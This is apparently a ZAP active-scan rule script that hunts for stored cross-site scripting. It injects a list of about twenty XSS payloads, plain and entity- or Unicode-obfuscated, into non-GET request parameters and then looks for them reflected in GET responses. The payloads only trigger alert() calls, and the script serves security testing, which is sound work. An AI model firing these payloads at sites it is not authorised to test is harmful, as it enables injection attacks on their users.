// An active scan rule script which replaces values with malicious XSS input for all non-get requests (post, put etc.) and 
// checks whether these values are included in any GET requests

// Note that new active scripts will initially be disabled
// Right click the script in the Scripts tree and select "enable"  

// Replace or extend these with your own attacks
var attacks = [
 '>"><script>alert("XSS")</script>&',
 '"><STYLE>@import"javascript:alert(\'XSS\')";</STYLE>',
 '>"\'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;',
 'alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>',
 '>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>',
 '\'%uff1cscript%uff1ealert(\'XSS\')%uff1c/script%uff1e\'',
 '">',
 '>"',
 '\'\';!--"<XSS>=&{()}',
 '<IMG SRC="javascript:alert(\'XSS\');">',
 '<IMG SRC=javascript:alert(\'XSS\')>',
 '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
 '<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>',
 '<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;',
 '&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>',
 '<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116:',
 '&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>',
 '<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74(',
 '&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>',
 '<IMG SRC="jav&#x09;ascript:alert(<WBR>\'XSS\');">',
 '<IMG SRC="jav&#x0A;ascript:alert(<WBR>\'XSS\');">',
 '<IMG SRC="jav&#x0D;ascript:alert(<WBR>\'XSS\');">'
 ]

/**
 * Scans a "node", i.e. an individual entry in the Sites Tree.
 * The scanNode function will typically be called once for every page. 
 * 
 * This method gets used to attack URL path parameters that don't get properly recognized and therefore wont be attacked in the scan() function
 * 
 * @param as - the ActiveScan parent object that will do all the core interface tasks 
 *     (i.e.: sending and receiving messages, providing access to Strength and Threshold settings,
 *     raising alerts, etc.). This is an ScriptsActiveScanner object.
 * @param msg - the HTTP Message being scanned. This is an HttpMessage object.
 */
function scanNode(as, msg) {
	copmsg = msg.cloneRequest();
	// so far only tested for GET requests, depending on the application also important for other request types
	if(copmsg.getRequestHeader().getMethod() == 'GET'){
		for (var i in attacks) {
                        // Copy requests before reusing them
			varmsg = msg.cloneRequest();
			// in Eas, the "anwendung_name" url parameter needs to be manually changed because zap doesn't parse it as an url parameter, therefore never calling the scan function
			// to mitigate that, the header and to an extent the url get changed 
			header = varmsg.getRequestHeader().toString();
			// right here a list of all URL path parameters to be replaced could be integrated to solve that problem with minimal effort
			headernew = header.replace("anwendung_name", attacks[i].toString());
			varmsg.setRequestHeader(headernew) 
			as.sendAndReceive(varmsg)
			stbody = varmsg.getResponseBody().toString()
			// check whether malicious payload that most likely comes from this script is included in the requests response	
			if(stbody.contains(attacks[i])){
				raiseAlert(as, msg, 'anwendung_name', attacks[i], attacks[i] + ' reflected in response',2,2, 'malicious payload got injected somewhere and is reflected in this requests response. Copy the attack to anwendung_name URL path parameter to imitate the attack')
			}
                        // regularily check if the scan was stopped
			if (as.isStop()) {
				return
			}
		}
	}
}

/**
 * Scans a specific parameter in an HTTP message.
 * The scan function will typically be called for every parameter in every URL and Form for every page.
 * 
 * @param as - the ActiveScan parent object that will do all the core interface tasks 
 *     (i.e.: sending and receiving messages, providing access to Strength and Threshold settings,
 *     raising alerts, etc.). This is an ScriptsActiveScanner object.
 * @param msg - the HTTP Message being scanned. This is an HttpMessage object.
 * @param {string} param - the name of the parameter being manipulated for this test/scan.
 * @param {string} value - the original parameter value.
 */
function scan(as, msg, param, value) {
	stmsg = msg = msg.cloneRequest();
	as.setParam(msg, param, value);
	as.sendAndReceive(msg);
	var stcode = msg.getResponseHeader().getStatusCode();
	var stbody = msg.getResponseBody().toString();
	// GET requests get checked for containing any of the malicious XSS strings, other requests get injected with those
	if(msg.getRequestHeader().getMethod() == 'GET'){
		for (var i in attacks) {
			if(stbody.contains(attacks[i])){
				raiseAlert(as, msg, param, attacks[i], attacks[i] + ' reflected in response of standard request',2,2,'malicious payload got injected somewhere and is reflected in this requests response. Copy the attack to anwendung_name URL path parameter to imitate the attack');
			}
                        // regularily check if the scan was stopped
			if (as.isStop()) {
				return;
			}
		}
	}
	// exclude DELETE requests to not accidently prematurely delete the evidence before it gets detected
	else if(msg.getRequestHeader().getMethod() != 'DELETE'){
		for (var i in attacks) {
                        // regularily check if the scan was stopped
			if (as.isStop()) {
				return
			}
			// Copy requests before reusing them
			msg = msg.cloneRequest();
			// inject malicious XSS strings as parameter values
			as.setParam(msg, param, attacks[i]);
			as.sendAndReceive(msg, false, false);
		}
	}
}

function raiseAlert(as, msg, param, attack, evidence, risk, confidence, info) {
	// raiseAlert(risk, int confidence, String name, String description, String uri, 
	//		String param, String attack, String otherInfo, String solution, String evidence, 
	//		int cweId, int wascId, HttpMessage msg)
	// risk: 0: info, 1: low, 2: medium, 3: high
	// confidence: 0: falsePositive, 1: low, 2: medium, 3: high, 4: confirmed
	as.raiseAlert(risk, confidence, 'Custom Stored XSS Error', 'an value, possibly of another request, could be found in the response', 
		msg.getRequestHeader().getURI().toString(), 
		param, attack, info, 'Please contact a security expert', evidence, 0, 0, msg);
}

